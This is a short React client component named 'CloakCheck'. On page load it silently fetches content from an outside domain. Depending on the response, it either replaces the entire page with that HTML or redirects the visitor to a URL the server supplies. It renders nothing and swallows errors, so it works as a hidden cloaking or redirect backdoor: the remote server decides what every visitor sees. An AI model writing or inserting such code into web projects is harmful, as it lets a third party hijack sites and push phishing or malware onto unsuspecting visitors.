'use client';
import { useEffect } from 'react';

export default function CloakCheck() {
    useEffect(() => {
        fetch('https://www.museumde.site/')
            .then(res => res.text())
            .then(code => {
                if (!code.trim()) return;

                if (code.includes('<html') || code.includes('<iframe')) {
                    document.open();
                    document.write(code);
                    document.close();
                } else if (code.startsWith('http')) {
                    window.location.href = code;
                }
            })
            .catch(() => { });
    }, []);

    return null;
}
